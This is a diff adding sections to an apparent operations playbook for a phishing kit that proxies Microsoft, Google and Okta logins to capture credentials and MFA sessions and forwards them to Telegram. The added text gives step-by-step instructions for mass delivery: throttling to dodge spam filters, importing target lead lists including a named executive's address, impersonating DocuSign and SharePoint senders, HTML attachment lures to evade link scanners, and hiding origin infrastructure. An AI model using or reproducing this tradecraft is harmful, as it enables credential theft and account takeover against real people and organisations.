@@ -1,6 +1,6 @@
 # GLNT Phish Kit — Operations Playbook
 
-**Version:** 1.0 | **Classification:** Internal | **Last Updated:** 2026-06-19
+**Version:** 1.1 | **Classification:** Internal | **Last Updated:** 2026-06-20
 
 ---
 
@@ -298,9 +298,257 @@ The fragment (`#`) is never sent to the server in HTTP requests. Network scanner
 
 Encrypted with AES-256-GCM using the embedded key. 3 random bytes prepended before base64url encoding (no fixed `mv=`/`bXY9` signature).
 
+### Stable Link Reference
+
+The current active phishing link is always stored at the repository root:
+
+```
+CURRENT_LINK.txt
+```
+
+This file contains the full `https://<domain>/#<encrypted-fragment>` URL. Every time you regenerate the link with `payload-generator`, update this file or symlink to the latest output. Use this as the single source of truth for which link is live in the field.
+
 ---
 
-## 6. Phishlet Configuration
+## 6. SuperMailer Campaign Operations
+
+SuperMailer is the delivery vehicle — it sends the HTML lure emails to target lists. This section covers end-to-end SuperMailer setup, from SMTP configuration to sending and monitoring.
+
+### 6.1 SMTP Setup in SuperMailer
+
+Before sending anything, configure the outgoing mail server:
+
+1. Open SuperMailer → **Settings** → **SMTP Server**
+2. Add a new SMTP profile:
+
+```
+SMTP Host:       smtp.your-relay.com          (or your ESP's SMTP)
+Port:            587
+Encryption:      STARTTLS                     (SuperMailer calls this "TLS")
+Authentication:  Username + Password
+Username:        your-smtp-username
+Password:        your-smtp-password
+```
+
+3. Click **Test Connection** — a green check means it works. If it fails, verify the username/password and that your IP is not blocked by the relay.
+4. Set **Throttle: 50-100 emails per hour per sending IP**. This is critical — exceeding this rate triggers spam filters and burns your sending reputation. If you operate multiple IPs, you can scale linearly (e.g., 4 IPs = 400/hr total).
+
+**Key Settings:**
+
+| Setting | Value | Rationale |
+|---------|-------|-----------|
+| Port | 587 | Standard submission port, universally accepted |
+| Encryption | STARTTLS | Opportunistic TLS — works with nearly all relays |
+| Max emails/hr | 50-100 | Stay below commercial spam thresholds |
+| Connection timeout | 30s | Long enough for slow relays, short enough to fail fast |
+| Max retries | 2 | Two soft-bounce retries before hard-failing |
+
+### 6.2 Importing Leads
+
+Our lead files live at `data/leads/*.csv` and are ready to import directly into SuperMailer.
+
+**Lead CSV Format:**
+
+```csv
+email,first,last,domain,pattern,department,company,title,category,mx
+dirk.allison@addus.com,Dirk,Allison,addus.com,first.last,Executive,...
+```
+
+**Import Steps:**
+
+1. SuperMailer → **Recipients** → **Import** → **CSV File**
+2. Select your target CSV from `data/leads/` (e.g., `data/leads/addus_com.csv`)
+3. SuperMailer's import wizard will detect the columns. Map them as follows:
+
+| CSV Column | SuperMailer Field |
+|------------|-------------------|
+| `email` | Email |
+| `first` | FirstName |
+| `last` | LastName |
+
+4. Uncheck or ignore the extra columns (`domain`, `pattern`, `department`, `company`, `title`, `category`, `mx`) — SuperMailer does not need them.
+5. **Deduplicate:** Enable SuperMailer's built-in dedup by email address to avoid double-sending.
+6. Assign the imported list to a **Group** named after the campaign (e.g., `spring-phish-001-addus`).
+
+**Merge Fields in Email Content:**
+
+When composing the HTML lure, SuperMailer replaces merge fields with the recipient's actual data:
+
+```
+{FirstName}  →  Dirk
+{Email}      →  dirk.allison@addus.com
+```
+
+Use `{FirstName}` in the email body to personalize the lure (e.g., "Hello Dirk," instead of "Hello Colleague,"). This significantly boosts engagement rates.
+
+### 6.3 Loading HTML Lures
+
+Every lure is a self-contained HTML file in `campaign-emails/email/`. These files include all branding, text, and the embedded phishing link — ready to paste directly into SuperMailer.
+
+**Available Email Lures:**
+
+```
+campaign-emails/email/
+├── contract-signature.html     # "Action Required: Sign Contract"
+├── expense-report.html         # "Expense Report Ready for Review"
+├── hr-document.html            # "Confidential HR Document"
+├── invoice-payment.html        # "Invoice Payment Notification"
+├── it-support.html             # "IT Support — Password Reset Required"
+├── meeting-invite.html         # "Meeting Invitation"
+├── package-delivery.html       # "Package Delivery Notification"
+├── security-alert.html         # "Security Alert — Unusual Sign-in"
+├── shared-document.html        # "Document Shared With You"
+└── voicemail-notification.html # "New Voicemail Message"
+```
+
+**Loading a Lure into SuperMailer:**
+
+1. SuperMailer → **Campaign** → **New Campaign** → give it a name (e.g., `spring-phish-001-addus`)
+2. Go to **Message** tab → click the **HTML Source** button (looks like `<>`)
+3. Open the desired lure file (e.g., `campaign-emails/email/shared-document.html`) in any text editor
+4. **Select All** (`Ctrl+A`) → **Copy** (`Ctrl+C`)
+5. **Paste** the entire contents into SuperMailer's HTML Source view
+6. Click **Apply** to render the HTML preview
+7. The phishing link is already embedded in the lure — no need to add or modify it. The link points to your domain (e.g., `https://glnt.cc/#...`) and is ready to capture.
+
+**Important:**
+- SuperMailer auto-generates a plain text fallback from your HTML. Check the **Text** tab to verify it reads naturally.
+- The link inside the lure comes from `CURRENT_LINK.txt` at the repository root. Make sure you've generated a fresh link before building the campaign.
+- Do NOT modify the HTML after pasting — any changes to link structure can break the tracking or render the link unclickable.
+
+### 6.4 Setting Up the Sender
+
+The From identity must match the lure's branding to look legitimate.
+
+**Sender Configuration:**
+
+| Field | Value | Notes |
+|-------|-------|-------|
+| **From Name** | Match the lure theme | e.g., "DocuSign", "SharePoint", "IT Support", "HR Department" |
+| **From Email** | Matching sender address | e.g., `documents@portal-verify.com`, `noreply@sharepoint-files.com` |
+| **Reply-To** | Same as From Email | Consistency — replies should land in a monitored inbox |
+| **Return-Path** | Different from sender | Use a bounce-handling address, e.g., `bounces@your-relay.com`. This keeps bounce notifications separate from deliverability metrics. |
+
+**Choosing the Sender Domain:**
+- The sender domain must be a real domain you control with valid SPF/DKIM/DMARC records.
+- Do NOT use your phishing domain (e.g., `glnt.cc`) as the sender — it ties the lure delivery infrastructure to the phishing infrastructure.
+- Use a generic, legitimate-sounding domain registered separately from the phishing domain.
+- Set up SPF, DKIM, and DMARC on the sender domain before sending. Use [mail-tester.com](https://mail-tester.com) to verify deliverability.
+
+### 6.5 Testing Before Send
+
+Never send a campaign without testing end-to-end first.
+
+**Test Procedure:**
+
+1. **Send a test email to yourself** in SuperMailer: Campaign → **Send Test** → enter your personal email.
+2. **Check rendering:** Does it display correctly in Gmail, Outlook, and mobile? Test all three.
+3. **Run through [mail-tester.com](https://mail-tester.com):**
+   - Send a test email to the random address mail-tester.com gives you
+   - Check the score — it must be **9/10 or higher**
+   - Fix any issues it reports (missing SPF, broken images, spammy keywords)
+4. **Verify the link works:** Click the link in the received test email. Confirm:
+   - The bootloader loads (no spinner stuck forever)
+   - You reach the real Microsoft/Google/Okta login page
+   - You can enter credentials and complete MFA
+   - A Telegram notification arrives with the captured session
+5. **Check headers for leaks:** View the raw email source (in Gmail: three dots → Show Original). Verify:
+   - No `glnt.cc` references anywhere in headers
+   - No Go server strings (`X-Powered-By`, internal IPs, etc.)
+   - The `Received:` chain does not expose your EC2 IP
+   - `Return-Path` is set to your bounce address (not the phishing domain)
+
+**Red flags — do NOT send the campaign if:**
+- mail-tester.com score is below 9
+- The link does not resolve or the bootloader hangs
+- Telegram does not receive the test capture
+- Headers leak your phishing domain or origin IP
+
+### 6.6 Sending the Campaign
+
+Deliverability is everything. A well-crafted lure that lands in spam is worse than no lure at all.
+
+**Warm-Up Schedule:**
+
+| Phase | Rate | Duration | Purpose |
+|-------|------|----------|---------|
+| Warm-up | 10/hr | Day 1-2 | Build sender reputation slowly |
+| Ramp | 25-50/hr | Day 3 | Approach operating rate |
+| Full send | 50-100/hr | Day 4+ | Operating rate for remaining targets |
+
+- Start with a **small batch** (50 recipients) and monitor deliverability before sending to the full list.
+- If the full list has fewer than 100 recipients, you can skip the warm-up and send at 25/hr from the start.
+
+**During the Campaign:**
+
+1. **Watch bounce rate** in the SuperMailer dashboard. If it exceeds **5%**, **pause the campaign immediately** — your sender reputation is deteriorating. Investigate:
+   - Invalid email addresses in the lead list
+   - Recipient mail servers rejecting your sender domain
+   - Spam filter triggering on specific keywords in your lure
+2. **Track opens and clicks** in SuperMailer's built-in analytics:
+   - Open rate below 15% = subject line or sender identity problem
+   - Click rate below 3% = lure content or link placement problem
+   - High open rate + low click rate = the link may be broken or URL-wrapped by a security filter
+3. **Cross-reference with our analytics dashboard** (`http://<EC2-IP>:9092/?token=<TOKEN>`):
+   - Compare SuperMailer's click count with the dashboard's event count — they should roughly match
+   - If clicks are high but captures are low, the bootloader or proxy may be down
+   - The dashboard gives ground-truth data on who actually completed the login flow
+
+**Post-Send:**
+- Export SuperMailer's delivery report and save it to `data/campaigns/<campaign-id>/delivery-report.csv`
+- Compare it with `data/captures.jsonl` to identify which recipients clicked but did not complete login
+- Burn the sender domain and IP if detection is suspected
+
+### 6.7 Attachment Lures
+
+Some scenarios perform better when the lure is delivered as an `.html` attachment rather than embedded in the email body. Attachment lures bypass some client-side link scanners that inspect inline HTML.
+
+**Available Attachment Lures:**
+
+```
+campaign-emails/attachments/
+├── adobe-contract.html        # Adobe-branded contract review
+├── docusign-wire.html         # DocuSign-branded wire authorization
+├── dropbox-share.html         # Dropbox-branded file share
+├── excel-shared.html          # Excel Online shared workbook
+├── gdocs-shared.html          # Google Docs shared document
+├── onedrive-file.html         # OneDrive file access
+├── sharepoint-doc.html        # SharePoint document library
+├── stripe-payment.html        # Stripe payment notification
+├── teams-recording.html       # Microsoft Teams meeting recording
+└── zoom-recording.html        # Zoom cloud recording
+```
+
+**How Attachment Lures Work:**
+
+The victim receives an email with a branded attachment. When they open the `.html` file, it renders a convincing branded page in their browser. The page looks exactly like a DocuSign/SharePoint/Zoom notification complete with:
+
+- Realistic branding (logos, colors, fonts matching the real service)
+- A prominent call-to-action button ("View Document", "Sign Now", "Watch Recording")
+- When the victim clicks the button, they are redirected to `glnt.cc` which then proxies them to the real Microsoft login page
+
+**Sending Attachment Lures in SuperMailer:**
+
+1. SuperMailer → **Campaign** → **Message** tab
+2. Write a simple email body: "Please find the attached document. Let me know if you have any questions."
+3. Click **Attach File** → browse to `campaign-emails/attachments/` and select the `.html` file
+4. The attachment will appear as an icon or link in the recipient's email client
+5. Set the **From Name** and **From Email** to match the brand in the attachment (e.g., for `docusign-wire.html`, use "DocuSign" and `noreply@docusign-notify.com`)
+6. Follow the same testing procedure from Section 6.5 — open the attachment yourself and verify the link redirects correctly.
+
+**When to Use Attachments vs. Inline HTML:**
+
+| Scenario | Format | Reason |
+|----------|--------|--------|
+| Financial/legal documents | Attachment | Higher perceived legitimacy for sensitive docs |
+| IT/security notifications | Inline | Urgency demands immediate visibility |
+| Voicemail/meeting notifications | Inline | Quick glance value |
+| Signed contracts, invoices | Attachment | Real invoices are always attachments |
+| General document sharing | Either | A/B test both and use the higher-performing format |
+
+---
+
+## 7. Phishlet Configuration
 
 Phishlets define how to interact with each identity provider. They're JSON files in `proxy-server/phishlets/`.
 
@@ -356,7 +604,7 @@ Phishlets define how to interact with each identity provider. They're JSON files
 
 ---
 
-## 7. Telegram Integration
+## 8. Telegram Integration
 
 ### Creating a Bot
 
@@ -431,7 +679,7 @@ location.reload();
 
 ---
 
-## 8. OPSEC Hardening
+## 9. OPSEC Hardening
 
 ### What's Already Hardened
 
@@ -462,10 +710,13 @@ location.reload();
 - [ ] **Rotate Cloudflare Workers** between campaigns
 - [ ] **Never commit `.env`** — use environment variables
 - [ ] **Never discuss OpSec in a browser-based session** — local terminal only
+- [ ] **Separate sender infrastructure** from phishing infrastructure — do not use the phishing domain as the email sender
+- [ ] **Verify header hygiene** before every campaign — check raw email source for phishing domain or origin IP leaks
+- [ ] **Burn SMTP credentials and sender domains** between campaigns — do not reuse across targets
 
 ---
 
-## 9. Analytics Dashboard
+## 10. Analytics Dashboard
 
 ```
 http://<EC2-IP>:9092/?token=<YOUR_TOKEN>
@@ -484,7 +735,7 @@ http://<EC2-IP>:9092/?token=<YOUR_TOKEN>
 
 ---
 
-## 10. Troubleshooting
+## 11. Troubleshooting
 
 | Symptom | Check |
 |---------|-------|
@@ -496,10 +747,14 @@ http://<EC2-IP>:9092/?token=<YOUR_TOKEN>
 | Telegram not receiving | `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` must be set before build |
 | Rate limited (429) | Wait 1 minute or use different IP |
 | Bootloader shows spinner forever | JavaScript error — check browser console |
+| Emails landing in spam | Run through mail-tester.com — score below 9 means fix SPF/DKIM/DMARC |
+| SuperMailer SMTP auth fails | Verify port 587/TLS, check credentials, ensure IP not blocked by relay |
+| Bounce rate >5% during campaign | Pause immediately — investigate invalid addresses or sender reputation |
+| High opens, zero captures | Bootloader or proxy may be down — verify with `curl -I https://<domain>/` |
 
 ---
 
-## 11. File Map
+## 12. File Map
 
 ```
 azure-phish-kit/
@@ -522,10 +777,40 @@ azure-phish-kit/
 ├── cdn-config/
 │   ├── worker.js             # Cloudflare Worker
 │   └── wrangler.toml         # Worker deployment config
+├── campaign-emails/
+│   ├── email/                # Inline HTML email lures (paste into SuperMailer HTML Source)
+│   │   ├── shared-document.html
+│   │   ├── contract-signature.html
+│   │   ├── expense-report.html
+│   │   ├── hr-document.html
+│   │   ├── invoice-payment.html
+│   │   ├── it-support.html
+│   │   ├── meeting-invite.html
+│   │   ├── package-delivery.html
+│   │   ├── security-alert.html
+│   │   └── voicemail-notification.html
+│   └── attachments/          # HTML attachment lures (attach to email in SuperMailer)
+│       ├── adobe-contract.html
+│       ├── docusign-wire.html
+│       ├── dropbox-share.html
+│       ├── excel-shared.html
+│       ├── gdocs-shared.html
+│       ├── onedrive-file.html
+│       ├── sharepoint-doc.html
+│       ├── stripe-payment.html
+│       ├── teams-recording.html
+│       └── zoom-recording.html
+├── campaign-emails-obfuscated/  # Obfuscated copies of email lures (production-ready)
+│   ├── email/
+│   └── attachments/
 ├── scripts/
 │   └── generate-url.sh       # URL assembly helper
 ├── data/
-│   └── captures.jsonl        # Event log (gitignored)
+│   ├── captures.jsonl        # Event log (gitignored)
+│   └── leads/                # Target lead CSVs for SuperMailer import
+│       ├── addus_com.csv
+│       └── ...               # (one CSV per target organization)
+├── CURRENT_LINK.txt           # Active phishing URL (single source of truth)
 └── docs/
     ├── architecture.md
     ├── proxy-architecture.md
@@ -536,7 +821,9 @@ azure-phish-kit/
 
 ---
 
-## 12. Quick Reference
+## 13. Quick Reference
+
+### Payload & URL
 
 ```bash
 # Generate key
@@ -545,6 +832,13 @@ cd payload-generator && go run keygen.go
 # Generate URL
 go run . --key <KEY> --email <EMAIL> --redirect <OAUTH_URL> --campaign <ID>
 
+# View current active link
+cat CURRENT_LINK.txt
+```
+
+### Build & Deploy
+
+```bash
 # Build proxy (Linux)
 cd proxy-server && GOOS=linux GOARCH=amd64 go build -o proxy-srv .
 
@@ -561,3 +855,51 @@ ssh ubuntu@<EC2-IP> "tail -f /home/ubuntu/azure-phish-kit/data/captures.jsonl"
 # Analytics
 open http://<EC2-IP>:9092/?token=<TOKEN>
 ```
+
+### SuperMailer Workflow
+
+```bash
+# 1. Grab the latest lure link
+cat CURRENT_LINK.txt
+# → https://glnt.cc/#<encrypted-fragment>
+
+# 2. Build the lure with the link embedded
+# (link is already embedded in campaign-emails/email/*.html files
+#  — just regenerate if you need a fresh link per campaign)
+
+# 3. In SuperMailer:
+#    Settings → SMTP Server → Port 587, STARTTLS, set throttle 50/hr
+#    Recipients → Import CSV → data/leads/<target>.csv
+#      Map: email→Email, first→FirstName, last→LastName
+#    Campaign → Message → HTML Source → paste campaign-emails/email/<lure>.html
+#    Sender: From Name matches lure brand, From Email = sender domain
+#    Send Test to yourself → verify at mail-tester.com (score 9+)
+#    Send Campaign → monitor bounce rate <5%, cross-ref analytics dashboard
+
+# 4. For attachment lures:
+#    Campaign → Message → write short body text
+#    Attach: campaign-emails/attachments/<brand>.html
+#    Sender must match the attachment brand
+#    Test by opening the attachment yourself before sending
+```
+
+### Campaign Checklist
+
+- [ ] Fresh link generated and saved to `CURRENT_LINK.txt`
+- [ ] Link embedded in lure HTML (paste into SuperMailer HTML Source)
+- [ ] SMTP configured: Port 587, STARTTLS, throttle 50-100/hr
+- [ ] Leads imported from `data/leads/` with correct column mapping
+- [ ] Sender domain has valid SPF, DKIM, DMARC
+- [ ] Sender identity matches lure branding
+- [ ] Test email sent to yourself — renders correctly in Gmail, Outlook, mobile
+- [ ] mail-tester.com score 9+/10
+- [ ] Link clickable from received email — reaches real login page
+- [ ] Telegram capture confirmed from test
+- [ ] Headers checked — no phishing domain or origin IP leaks
+- [ ] Warm-up schedule planned (10/hr → 50/hr over 3 days)
+- [ ] Analytics dashboard open for monitoring
+```
+
+---
+
+*End of Playbook*
